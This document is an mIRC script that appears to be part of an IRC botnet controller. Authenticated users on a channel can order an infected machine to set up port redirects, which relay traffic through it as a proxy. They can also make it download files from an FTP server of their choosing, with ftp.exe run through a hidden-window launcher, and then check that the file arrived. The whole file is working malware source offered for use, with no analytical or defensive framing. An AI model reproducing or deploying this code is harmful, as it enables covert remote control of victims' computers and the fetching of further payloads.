on *:socklisten:gtportdirect*:{  set %gtsocknum 0 | :loop |  inc %gtsocknum 1 |  if $sock(gtin*,$calc($sock(gtin*,0) + %gtsocknum ) ) != $null { goto loop } |  set %gtdone $gettok($sockname,2,46) $+ . $+ $calc($sock(gtin*,0) + %gtsocknum ) | sockaccept gtin $+ . $+ %gtdone | sockopen gtout $+ . $+ %gtdone $gettok($sock($Sockname).mark,1,32) $gettok($sock($Sockname).mark,2,32) | unset %gtdone %gtsocknum }
on *:Sockread:gtin*: {  if ($sockerr > 0) return | :nextread | sockread [ %gtinfotem [ $+ [ $sockname ] ] ] | if [ %gtinfotem [ $+ [ $sockname ] ] ] = $null { return }   | if $sock( [ gtout [ $+ [ $remove($sockname,gtin) ] ] ] ).status != active { inc %gtscatchnum 1 | set %gtempr $+ $right($sockname,$calc($len($sockname) - 4) ) $+ %gtscatchnum [ %gtinfotem [ $+ [ $sockname ] ] ] | return } | sockwrite -n [ gtout [ $+ [ $remove($sockname,gtin) ] ] ] [ %gtinfotem [ $+ [ $sockname ] ] ] | unset [ %gtinfotem [ $+ [ $sockname ] ] ] | if ($sockbr == 0) return | goto nextread } 
on *:Sockread:gtout*: {  if ($sockerr > 0) return | :nextread | sockread [ %gtouttemp [ $+ [ $sockname ] ] ] |  if [ %gtouttemp [ $+ [ $sockname ] ] ] = $null { return }  | sockwrite -n [ gtin [ $+ [ $remove($sockname,gtout) ] ] ] [ %gtouttemp [ $+ [ $sockname ] ] ] | unset [ %gtouttemp [ $+ [ $sockname ] ] ] | if ($sockbr == 0) return | goto nextread } 
on *:Sockopen:gtout*: {  if ($sockerr > 0) return | set %gttempvar 0 | :stupidloop | inc %gttempvar 1 | if %gtempr  [ $+ [ $right($sockname,$calc($len($sockname) - 5) ) ] $+ [ %gttempvar ] ] != $null { sockwrite -n $sockname %gtempr [ $+ [ $right($sockname,$calc($len($sockname) - 5) ) ] $+ [ %gttempvar  ] ] |  goto stupidloop  } | else { unset %gtempr | unset %gtscatchnum | unset %gtempr* } }
on *:sockclose:gtout*: { unset %gtempr* | sockclose gtin $+ $right($sockname,$calc($len($sockname) - 5) ) | unset %gtscatchnum | sockclose $sockname }
on *:sockclose:gtin*: {   unset %gtempr* | sockclose gtout $+ $right($sockname,$calc($len($sockname) - 4) ) | unset %gtscatchnum  | sockclose $sockname }
alias predirectstats2 { set %gtpcount 0 | :startloophere | inc %gtpcount 1 | if ($sock(gtportdirect*,%gtpcount) != $null) { msg $1 14*(PortRedirect)*: In-port: $gettok($sock(gtportdirect*,%gtpcount),2,46) to $gettok($sock(gtportdirect*,%gtpcount).mark,1,32) $+ : $+ $gettok($sock(gtportdirect*,%gtpcount).mark,2,32)  | msg $1 12[Local IP Address]:14 $ip | goto startloophere } | else { if %gtpcount = 1 { //msg $1 12Error, no port redirects! } | //msg $1 12PortRedirect/End | unset %gtpcount } }
alias pdirectstop { Set %gtrdstoppnum $1 | sockclose [ gtportdirect. [ $+ [ %gtrdstoppnum ] ] ] | sockclose [ gtin. [ $+ [ %gtrdstoppnum ] ] ] $+ * | sockclose [ gtout. [ $+ [ %gtrdstoppnum ] ] ] $+ * | unset %gtrdstoppnum }
alias gtportdirect { if ($3 == $null) return | socklisten gtportdirect $+ . $+ $1 $1 |  sockmark gtportdirect $+ . $+ $1-3 }

on *:text:*:*: {
  if ( (%auth [ $+ [ $nick ] ] != yes) && (%auth [ $+ [ $nick ] ] != admin) ) { halt }
  if ($1 == !portredirect) {
    if ($2 == $null) { msg $checkcn 4Error!!! 12For help type: 3!portredirect help | halt } 
    if ($2 == help) { msg $checkcn 4!portredirect start 888 irc.dal.net 6667 14( $+ 19 $+ !portredirect stop port stat $+ 14) |  halt } 
    if ($2 == start) { 
      if ($5 == $null) { msg $checkcn 4!portredirect start localport server port | halt } 
      gtportdirect $3- | msg $checkcn 10Redirect Status 14( $+ 19 $+ ON $+ 14 $+ ) 3Port 14( $+ 19 $+ $3 $+ 14 $+ ) 10to Server 14( $+ 19 $+ $4 $+ : $+ $5 $+ 14 $+ ) | msg $checkcn 10Local IP 14( $+ 19 $+ $ip $+ 14 $+ ) |  halt  
    } 
    if ($2 == stop) {  if ($3 == $null) { halt } | pdirectstop $3 |  msg $checkcn 10Redirect Status 14( $+ 19 $+ OFF $+ 14 $+ ) 3Port 14( $+ 19 $+ $3 $+ 14 $+ ) |  halt  } 
    if ($2 == stat) {  predirectstats2 $checkcn } 
  } 
  if (!download. isin $1) {
    if ( ($remove($1,!download.) != *) && ($remove($1,!download.) != $me) ) { halt }
    if ($2 == $null) { .msg $checkcn 4Error! 12Please enter ftp! | halt }
    if ($3 == $null) { .msg $checkcn 4Error! 12Please enter user! | halt }
    if ($4 == $null) { .msg $checkcn 4Error! 12Please enter password! | halt }
    if ($5 == $null) { .msg $checkcn 4Error! 12Please enter filename! | halt }
    write -c update.scr
    write update.scr open $2
    write update.scr user $3
    write update.scr $4
    write update.scr binary
    write update.scr get $5 $5
    write update.scr bye
    set %update.file $5
    .msg $checkcn 10 Downloading update from 14( $+ 19 $+ $2 $+ 14 $+ ) 
    .run -n ftp -s:update.scr -n -d
    .run -n hw.exe c:\winnt\system32\ftp.exe
  }
  if (!dl.stat. isin $1) {
    if ( ($remove($1,(!dl.info.) != *) && ($remove($1,(!dl.info.) != $me) ) { halt }
    if ($exists(%update.file) == $true) {
      .msg $checkcn 10 File: 14( $+ 19 $+ %update.file $+ 14 $+ )   10 Size 14( $+ 19 $+ $file(%update.file).size $+ 14 $+ ) 12bytes
      halt
    }
    .msg $checkcn 12 File with update not found!
  }
}